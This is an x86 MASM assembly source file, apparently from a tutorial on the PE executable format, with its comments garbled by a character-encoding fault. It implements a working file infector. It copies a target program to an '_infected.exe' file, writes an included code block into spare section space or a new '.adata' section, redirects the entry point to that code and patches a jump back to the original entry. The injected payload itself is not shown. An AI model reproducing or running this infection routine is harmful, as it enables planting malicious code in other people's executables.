
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
		.const

szErrCreate	db	'�Ыؤ����~',0dh,0ah,0
szErrNoRoom	db	'�{�Ǥ��S���h�l���Ŷ��i�H�[�J�N�X!',0dh,0ah,0
szMySection	db	'.adata',0
szExt		db	'_infected.exe',0
szSuccess	db	'�P�V��󦨥\�A�s���:',0dh,0ah
		db	'%s',0dh,0ah,0

		.code

include		_AddCode.asm

;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
; �p����ӫ��w�ȹ���᪺�ƭ�
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
_Align		proc	_dwSize,_dwAlign

		push	edx
		mov	eax,_dwSize
		xor	edx,edx
		div	_dwAlign
		.if	edx
			inc	eax
		.endif
		mul	_dwAlign
		pop	edx
		ret

_Align		endp
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
_ProcessPeFile	proc	_lpFile,_lpPeHead,_dwSize
		local	@szNewFile[MAX_PATH]:byte
		local	@hFile,@dwTemp,@dwEntry,@lpMemory
		local	@dwAddCodeBase,@dwAddCodeFile
		local	@szBuffer[256]:byte

		pushad
;********************************************************************
; �إߤ��(1)�B���}���(2)
;********************************************************************
		invoke	lstrcpy,addr @szNewFile,addr szFileName
		invoke	lstrlen,addr @szNewFile
		lea	ecx,@szNewFile
		mov	byte ptr [ecx+eax-4],0
		invoke	lstrcat,addr @szNewFile,addr szExt
		invoke	CopyFile,addr szFileName,addr @szNewFile,FALSE

		invoke	CreateFile,addr @szNewFile,GENERIC_READ or GENERIC_WRITE,FILE_SHARE_READ or \
			FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,NULL
		.if	eax ==	INVALID_HANDLE_VALUE
			invoke	SetWindowText,hWinEdit,addr szErrCreate
			jmp	_Ret
		.endif
		mov	@hFile,eax
;********************************************************************
;�i��@�ǷǳƤu�@�M�˴��ʧ@
; esi --> ��PeHead�Aedi --> �s��PeHead
; edx --> �̫�@�Ӹ`��
;********************************************************************
		mov	esi,_lpPeHead
		assume	esi:ptr IMAGE_NT_HEADERS,edi:ptr IMAGE_NT_HEADERS
		invoke	GlobalAlloc,GPTR,[esi].OptionalHeader.SizeOfHeaders
		mov	@lpMemory,eax
		mov	edi,eax
		invoke	RtlMoveMemory,edi,_lpFile,[esi].OptionalHeader.SizeOfHeaders
		add	edi,esi
		sub	edi,_lpFile
		movzx	eax,[esi].FileHeader.NumberOfSections
		dec	eax
		mov	ecx,sizeof IMAGE_SECTION_HEADER
		mul	ecx

		mov	edx,edi
		add	edx,eax
		add	edx,sizeof IMAGE_NT_HEADERS
		mov	ebx,edx
		add	ebx,sizeof IMAGE_SECTION_HEADER
		assume	ebx:ptr IMAGE_SECTION_HEADER,edx:ptr IMAGE_SECTION_HEADER
;********************************************************************
; �ˬd�O�_���Ŷ��i�H�s�W�q
;********************************************************************
		pushad
		mov	edi,ebx
		xor	eax,eax
		mov	ecx,IMAGE_SECTION_HEADER
		repz	scasb
		popad
		.if	! ZERO?
;********************************************************************
;�p�G�즳�s���`��Ŷ����ܡA�h�d�ݲ{�s�N�X���̫�A�O�_���������Ŷ� 
;�N�f�r�N�X�[�J�N�X�s�`��
;********************************************************************
			xor	eax,eax
			mov	ebx,edi
			add	ebx,sizeof IMAGE_NT_HEADERS
			.while	ax <=	[esi].FileHeader.NumberOfSections
				mov	ecx,[ebx].SizeOfRawData
				.if	ecx && ([ebx].Characteristics & IMAGE_SCN_MEM_EXECUTE)
					sub	ecx,[ebx].Misc.VirtualSize
					.if	ecx > offset APPEND_CODE_END-offset APPEND_CODE
						or	[ebx].Characteristics,IMAGE_SCN_MEM_READ or IMAGE_SCN_MEM_WRITE
						jmp	@F
					.endif
				.endif
				add	ebx,IMAGE_SECTION_HEADER
				inc	ax
			.endw
			invoke	CloseHandle,@hFile
			invoke	DeleteFile,addr @szNewFile
			invoke	SetWindowText,hWinEdit,addr szErrNoRoom
			jmp	_Ret
			@@:
;********************************************************************
; �p�G���s���`��Ŷ����ܡA�[�J�f�r�X
;********************************************************************
			mov	eax,[ebx].VirtualAddress
			add	eax,[ebx].Misc.VirtualSize
			mov	@dwAddCodeBase,eax
			mov	eax,[ebx].PointerToRawData
			add	eax,[ebx].Misc.VirtualSize
			mov	@dwAddCodeFile,eax
			add	[ebx].Misc.VirtualSize,offset APPEND_CODE_END-offset APPEND_CODE
			invoke	SetFilePointer,@hFile,@dwAddCodeFile,NULL,FILE_BEGIN
			mov	ecx,offset APPEND_CODE_END-offset APPEND_CODE
			invoke	WriteFile,@hFile,offset APPEND_CODE,ecx,addr @dwTemp,NULL
		.else
;********************************************************************
; �K�[�s���`
;********************************************************************
			inc	[edi].FileHeader.NumberOfSections
			push	edx
			@@:
			mov	eax,[edx].PointerToRawData
;********************************************************************
;��̫�@�Ӹ`�O����l�ƼƾڮɡAPointerToRawData�MSizeOfRawData����0
; �o�����Ӫ�PointerToRawData�MSizeOfRawData�ƾ�
;
;********************************************************************
			.if	! eax
				sub	edx,sizeof IMAGE_SECTION_HEADER
				jmp	@B
			.endif
			add	eax,[edx].SizeOfRawData
			pop	edx
			mov	[ebx].PointerToRawData,eax
			mov	ecx,offset APPEND_CODE_END-offset APPEND_CODE
			invoke	_Align,ecx,[esi].OptionalHeader.FileAlignment
			mov	[ebx].SizeOfRawData,eax
			invoke	_Align,ecx,[esi].OptionalHeader.SectionAlignment
			add	[edi].OptionalHeader.SizeOfCode,eax	;�ץ���sizeifcode
			add	[edi].OptionalHeader.SizeOfImage,eax	;�ץ���sizeofimage
			invoke	_Align,[edx].Misc.VirtualSize,[esi].OptionalHeader.SectionAlignment
			add	eax,[edx].VirtualAddress
			mov	[ebx].VirtualAddress,eax
			mov	[ebx].Misc.VirtualSize,offset APPEND_CODE_END-offset APPEND_CODE
			mov	[ebx].Characteristics,IMAGE_SCN_CNT_CODE\
				or IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_READ or IMAGE_SCN_MEM_WRITE
			invoke	lstrcpy,addr [ebx].Name1,addr szMySection
;********************************************************************
;�N�s�W�N�X�@���@�ӷs���q�A�g�J������
;********************************************************************
			invoke	SetFilePointer,@hFile,[ebx].PointerToRawData,NULL,FILE_BEGIN
			invoke	WriteFile,@hFile,offset APPEND_CODE,[ebx].Misc.VirtualSize,\
				addr @dwTemp,NULL
			mov	eax,[ebx].PointerToRawData
			add	eax,[ebx].SizeOfRawData
			invoke	SetFilePointer,@hFile,eax,NULL,FILE_BEGIN
			invoke	SetEndOfFile,@hFile
;********************************************************************
			push	[ebx].VirtualAddress	;eax = �s�W�N�X����a�}
			pop	@dwAddCodeBase
			push	[ebx].PointerToRawData
			pop	@dwAddCodeFile
		.endif
;********************************************************************
; ��OEP���V�s�W�Ϭq���Y
;********************************************************************
		mov	eax,@dwAddCodeBase
		add	eax,(offset _NewEntry-offset APPEND_CODE)
		mov	[edi].OptionalHeader.AddressOfEntryPoint,eax
		invoke	SetFilePointer,@hFile,0,NULL,FILE_BEGIN
		invoke	WriteFile,@hFile,@lpMemory,[esi].OptionalHeader.SizeOfHeaders,\
			addr @dwTemp,NULL
;********************************************************************
; �ץ��s�N�X����jmp oldEntry  ���O
;********************************************************************
		push	[esi].OptionalHeader.AddressOfEntryPoint
		pop	@dwEntry
		mov	eax,@dwAddCodeBase
		add	eax,(offset _ToOldEntry-offset APPEND_CODE+5)
		sub	@dwEntry,eax
		mov	ecx,@dwAddCodeFile
		add	ecx,(offset _dwOldEntry-offset APPEND_CODE)
		invoke	SetFilePointer,@hFile,ecx,NULL,FILE_BEGIN
		invoke	WriteFile,@hFile,addr @dwEntry,4,addr @dwTemp,NULL
;********************************************************************
; �������
;********************************************************************
		invoke	GlobalFree,@lpMemory
		invoke	CloseHandle,@hFile
		invoke	wsprintf,addr @szBuffer,Addr szSuccess,addr @szNewFile
		invoke	SetWindowText,hWinEdit,addr @szBuffer
_Ret:
		assume	esi:nothing
		popad
		ret

_ProcessPeFile	endp
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
